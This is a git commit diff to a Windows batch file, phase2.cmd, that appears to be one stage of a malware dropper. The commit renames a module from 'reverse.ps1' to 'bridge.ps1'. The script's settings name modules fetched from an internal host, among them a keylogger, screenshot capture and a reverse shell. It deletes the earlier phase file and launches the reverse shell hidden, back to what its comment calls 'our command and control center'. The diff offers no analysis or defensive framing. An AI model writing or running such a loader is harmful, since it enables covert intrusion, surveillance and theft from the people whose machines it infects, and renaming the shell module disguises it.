d8c5d40746949afd9509005e0db981447bfcafb5
b3rg <bergb9443@gmail.com>
2023-03-15 23:00:28 -0400

    renaming script

--- staging/phase2.cmd
+++ staging/phase2.cmd
@@ -6,7 +6,7 @@ set "INITIAL_PATH=%cd%"
 set "FILE_NAME=phase2.cmd"
 set "MODULES_PATH=http://10.0.0.212:8000/modules"
 set "TEMP_PATH=C:\Users\%username%\AppData\Local\Temp"
-set "modulesName=scanner.ps1 screenshot.ps1 fileHandler.ps1 jobHandler.ps1 keylogger.ps1 reverse.ps1"
+set "modulesName=scanner.ps1 screenshot.ps1 fileHandler.ps1 jobHandler.ps1 keylogger.ps1 bridge.ps1"
 
 @REM Remove phase1
 del %PATH_PHASE1%
@@ -24,4 +24,4 @@ cd modules
 TIMEOUT /T 10
 
 @REM create a reverse shell connection back to our command and control center (powershell received from powercat module on github)
-powershell -WindowStyle Hidden -c ".\reverse.ps1"
+powershell -WindowStyle Hidden -c ".\bridge.ps1"
